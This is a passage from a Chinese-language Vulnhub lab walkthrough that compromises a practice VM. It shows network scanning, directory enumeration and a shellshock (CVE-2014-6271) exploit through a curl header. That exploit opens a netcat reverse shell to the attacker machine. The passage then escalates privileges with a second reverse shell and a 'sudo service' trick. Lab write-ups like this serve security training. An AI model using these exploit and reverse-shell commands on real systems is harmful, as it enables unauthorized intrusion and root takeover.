+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.0.102	08:00:27:c5:88:8d	PCS Systemtechnik GmbH</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nmap -p- -sC -sV 192.168.0.102</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-30 02:53 EDT</span><br><span class="line">Nmap scan report for localhost (192.168.0.102)</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 37:36:60:3e:26:ae:23:3f:e1:8b:5d:18:e7:a7:c7:ce (RSA)</span><br><span class="line">|   256 34:9a:57:60:7d:66:70:d5:b5:ff:47:96:e0:36:23:75 (ECDSA)</span><br><span class="line">|_  256 ae:7d:ee:fe:1d:bc:99:4d:54:45:3d:61:16:f8:6c:87 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>目标的IP是 <code>192.168.0.102</code> 开放的服务有<code>80</code> <code>22</code>端口</p>
+<hr>
+<p>目标的基本信息已经明确，下一步就是对目标进行更深层的信息收集，以便得到更深层的信息，方便后期的漏洞利用</p>
+<p>使用工具<code>dirsearch</code>可以挖掘到目标的存在页面</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(yifang㉿yifang)-[~]</span><br><span class="line">└─$ dirsearch -u http://192.168.0.102/</span><br><span class="line"></span><br><span class="line">[02:59:56] 403 -  278B  - /cgi-bin/</span><br><span class="line">[03:01:17] 200 -    4KB - /README.md</span><br><span class="line">[03:01:19] 200 -    1KB - /admin_login.php</span><br><span class="line">[03:01:21] 200 -    4KB - /contact.php</span><br><span class="line">[03:01:23] 200 -  472B  - /header.php</span><br><span class="line">[03:01:23] 200 -    5KB - /home.php</span><br><span class="line">[03:01:23] 200 -    4KB - /images/</span><br><span class="line">[03:01:23] 200 -    5KB - /index.php</span><br><span class="line">[03:01:23] 200 -    5KB - /index.php/login/</span><br><span class="line">[03:01:25] 200 -    8KB - /news.php</span><br></pre></td></tr></table></figure>
+
+<p>在进一步查看只会发现有价值的信息就是admin_login.php，这个是管理员的登录地址。还有比较有意思的就是README.md文件</p>
+<hr>
+<h3 id="2-源码泄露"><a href="#2-源码泄露" class="headerlink" title="2.源码泄露"></a>2.源码泄露</h3><p>README.md文件中有一些提示<img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071254304.png" alt="git"></p>
+<p>剩下的操作岂不是信手拈来？直接在后台页面登录</p>
+<p>可以登录后台，但是在一番尝试后，发现并没有任何*用，于是尝试寻找其他漏洞</p>
+<h3 id="3-shellshock漏洞"><a href="#3-shellshock漏洞" class="headerlink" title="3.shellshock漏洞"></a>3.shellshock漏洞</h3><p>在信息收集的时候发现了cgi-bin的目录，有这个目录也就以为着可能存在<code>shellshock</code>[破壳漏洞]，在扫描的时候，反馈的是<code>403</code>状态，但是并不代表底下的文件不能被访问，于是尝试使用<code>dirsearch</code>进行暴力破解</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(yifang㉿yifang)-[~]</span><br><span class="line">└─$ dirsearch -u http://192.168.0.102/cgi-bin/  -f -e sh,cgi </span><br><span class="line">[03:11:41] Starting: </span><br><span class="line">[03:11:56] 500 -  611B  - /cgi-bin/backup.cgi</span><br><span class="line">[03:12:11] 500 -  611B  - /cgi-bin/shell.sh</span><br><span class="line">[03:12:11] 500 -  650B  - /cgi-bin/shell.sh/</span><br></pre></td></tr></table></figure>
+
+<p>果然存在两个文件，如果这个两个文件如果存在漏洞的话，那么就可以直接调用操作系统的<code>Bash</code>[需要当前操作系统bash存在漏洞]</p>
+<h3 id="4-边境突破"><a href="#4-边境突破" class="headerlink" title="4.边境突破"></a>4.边境突破</h3><p>nmap正好集成了这一类漏洞的POC，可以来试试</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/backup.cgi,cmd=ls 192.168.0.102</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">| http-shellshock: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   HTTP Shellshock vulnerability</span><br><span class="line">|     State: VULNERABLE (Exploitable)</span><br><span class="line">|     IDs:  CVE:CVE-2014-6271</span><br><span class="line">|       This web application might be affected by the vulnerability known</span><br><span class="line">|       as Shellshock. It seems the server is executing commands injected</span><br><span class="line">|       via malicious HTTP headers.</span><br></pre></td></tr></table></figure>
+
+<p>nmap已经爆出了CVE编号，百度搜索一波<code>CVE-2014-6271</code> </p>
+<p>可以参考一下以下文章</p>
+<hr>
+<p>接下来就是漏洞利用</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H &quot;user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c &#x27;nc -e /bin/bash 192.168.0.103 4444&#x27;&quot; http://192.168.0.103/cgi-bin/backup.cgi</span><br></pre></td></tr></table></figure>
+
+<p>Kali端</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+
+<p>成功接收到shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071255222.png" alt="nc"></p>
+<h3 id="5-权限提升"><a href="#5-权限提升" class="headerlink" title="5.权限提升"></a>5.权限提升</h3><p>得到了目标的www用户的shell，这个权限是很低的，因此要继续寻找其他漏洞，以供获取更高的权限</p>
+<p>首先老传统，先升级nc的shell，<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p>然后，<code>sudo -l</code>命令寻找可以免密码运行的程序</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071255887.png" alt="sudo"></p>
+<p>看到这里，当然是想去运行一下这个文件到底是干什么的</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -u thor  /home/thor/./hammer.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071255159.png" alt="thor"></p>
+<p>以<code>thor</code>身份运行<code>hammer.sh</code>文件，发现可以执行操作系统命令，直接执行<code>nc -e /bin/bash 192.168.0.103 5555</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071255960.png" alt="thorshell"></p>
+<p>然后使用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; &amp;&amp; sudo -l</code>寻找能够提权的方法,发现<code>thor</code>用户拥有执行service命令SUDO权力，在</p>
+<p>在该网站，寻找service的提权方式</p>
+<p><code>sudo service ../../bin/sh</code></p>
+<p>提权成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202111071256543.png" alt="root"></p>
+<p>打靶结束！！！</p>
+]]></content>
+      <categories>
+        <category>Vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub-Easy</tag>
       </tags>
   </entry>
 </search>
